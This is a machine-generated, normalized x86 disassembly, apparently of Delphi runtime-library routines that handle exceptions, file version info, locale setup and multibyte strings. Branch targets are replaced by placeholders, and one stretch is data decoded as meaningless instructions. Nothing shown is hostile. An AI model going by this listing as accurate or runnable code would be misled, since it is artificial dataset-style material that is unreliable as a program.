mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40bb2c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405efc
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_40905c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_40405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bb33
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
add esp 0xfffffff0
call sub_403558
sub_40bb33
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_40bb54
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40405c
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_40bbc8
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_402978
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40bc28
sub al 0xbc
inc eax
add [ esi ] cl
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
add al 0x0
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_4039c0
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b9c8
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40bbc8
mov edx eax
sub_40bc9c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bd38
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4040a0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bd3f
lea eax [ ebp - 0x20 ]
call sub_404008
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40bd8c
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40be24
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bfdf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_404278
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408864
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bfe6
lea eax [ ebp - 0x170 ]
call sub_404008
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_40402c
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40bff0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c0ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40bd8c
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b9c8
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
push ebp
call sub_40be24
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c0b2
lea eax [ ebp - 0x10 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
mov ebx eax
sub_40c0cc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40c0bc
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40be0c
mov eax [ rw-data ]
mov [ eax ] sub_40bff0
mov eax sub_40bd58
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40bd74
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40c150
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403234
xor eax eax
mov [ rw-data ] eax
sub_40c1d0
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_404278
sub_40c260
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c336
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4040a0
lea eax [ ebp - 0x8 ]
call j_sub_4044d4
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4044c8
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c33d
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov eax ebx
call sub_40279c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c319
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4044c8
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4027bc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c34c
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c3c4
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4044c8
mov edx esi
dec edx
call sub_40c34c
sub_40c400
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4042c8
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c428
pop esi
pop ebx
retn
mov eax ebx
call sub_4042c8
mov esi eax
sub_40c428
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4042c8
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c638
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c480
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_4042c8
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c638
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c638
dec eax
mov ebx eax
sub_40c510
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4042c8
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c480
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4042c8
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c574
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4042c8
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_4042c8
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c480
mov eax esi
call sub_4042c8
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_4042c8
mov [ esp ] eax
jmp r-xdata
sub_40c5fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_4044c8
add eax esi
dec eax
call sub_40c5d4
sub_40c638
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_4044c8
add eax ebx
dec eax
call sub_40c5d4
add eax ebx
sub_40c674
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_4042c8
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c3c4
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c6a8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_40405c
mov eax [ ebx ]
call sub_4042c8
mov edx eax
mov eax [ ebx ]
call sub_40c674
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_4042d0
sub_40c6e8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_4044c8
push eax
mov eax esi
call sub_4044c8
mov ebp eax
mov eax ebp
pop edx
call sub_40c7ac
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c720
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_408168
mov eax esi
call sub_4042c8
mov ebp eax
mov eax edi
mov edx ebp
call sub_404654
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_4044d4#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_4044d4#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_4044d4#2
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c7ac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408994
mov [ esp ] eax
mov eax ebp
call sub_408994
mov edi eax
mov edx ebp
mov eax esi
call sub_408b2c
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c3e8
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408b2c
mov ebx eax
inc ebx
sub_40c84c
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c874
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c874
test eax eax
jne r-xdata
sub_40c874
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408b18
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c3e8
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408b18
mov edi eax
test edi edi
jne r-xdata
sub_40c8b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c918
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_404278
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_4084bc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c91f
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_40c928
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c8b4
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c9a0
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c988
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c928
pop ecx
push ebp
call sub_40c928
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402d64
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40cb14
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40cddf
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c9a0
call sub_40b2b0
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b200
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_40405c
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b200
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_4084bc
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b200
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_4084bc
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b24c
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b24c
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b200
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_4084bc
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b24c
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b200
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b538
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_40405c
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b200
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b538
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_40405c
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b24c
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b200
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_40405c
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b200
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_40405c
lea eax [ ebp - 0x8 ]
call sub_404008
lea eax [ ebp - 0xc ]
call sub_404008
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b200
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_4084bc
test eax eax
jne r-xdata
call sub_40b488
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040a0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040a0
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404388
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404388
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b24c
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cde6
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_40402c
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40b200
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_4084bc
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b200
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_4084bc
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4040a0
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4040a0
jmp r-xdata
sub_40ce8c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40cfaf
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4040a0
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4040a0
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_408134
lea edx [ ebp - 0xc ]
mov eax edi
call sub_408134
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_4040a0
mov eax esi
call sub_404008
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40c6e8
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cfb6
